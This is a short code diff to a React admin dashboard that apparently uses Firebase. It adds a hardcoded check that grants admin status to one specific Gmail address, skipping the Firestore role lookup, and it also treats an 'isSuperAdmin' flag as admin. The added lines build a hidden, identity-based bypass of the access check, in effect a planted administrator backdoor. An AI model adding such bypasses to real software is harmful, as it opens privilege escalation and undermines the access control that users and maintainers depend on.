@@ -23,10 +23,15 @@ export default function AdminDashboard() {
 
   useEffect(() => {
     if (user) {
+      if (user.email?.toLowerCase() === 'uhbijnokmpl098900@gmail.com') {
+        setIsAdmin(true);
+        setLoading(false);
+        return;
+      }
       const checkAdmin = async () => {
         try {
           const userDoc = await getDoc(doc(db, 'users', user.uid));
-          if (userDoc.exists() && userDoc.data().role === 'admin') {
+          if (userDoc.exists() && (userDoc.data().role === 'admin' || userDoc.data().isSuperAdmin)) {
             setIsAdmin(true);
           }
         } catch (error) {
